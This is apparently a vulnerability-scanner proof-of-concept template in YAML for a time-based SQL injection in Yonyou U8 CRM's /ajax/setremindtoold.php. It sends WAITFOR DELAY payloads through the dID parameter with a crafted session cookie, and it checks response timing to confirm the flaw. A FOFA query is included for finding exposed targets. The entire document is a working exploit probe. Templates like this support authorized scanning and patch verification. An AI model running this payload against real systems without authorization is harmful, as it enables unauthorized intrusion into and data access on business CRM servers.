id: poc-yaml-yongyon-u8-crm-setremindtoold-sqli
info:
  name: 用友U8-CRM setremindtoold.php SQL注入
  severity: high
  tags:
  - sql-injection
  finger: 用友U8+CRM
  fofa: title="用友U8CRM"
variables:
  t1: random_int(5,9)
  t2: t1 + 2
  t3: random_int(1,4)
  t4: t3 + 2
requests:
- method: POST
  path: /ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:{{.t1}}'--
  headers:
    Cookie: PHPSESSID=bgsesstimeout-;
  expression: "status_code == 200 && \nbody == \"1\" &&\nduration >= t1 &&\nduration\
    \ <= t2\n"
- method: POST
  path: /ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:{{.t3}}'--
  headers:
    Cookie: PHPSESSID=bgsesstimeout-;
  expression: "status_code == 200 && \nbody == \"1\" &&\nduration >= t3 &&\nduration\
    \ <= t4\n"
transport: http
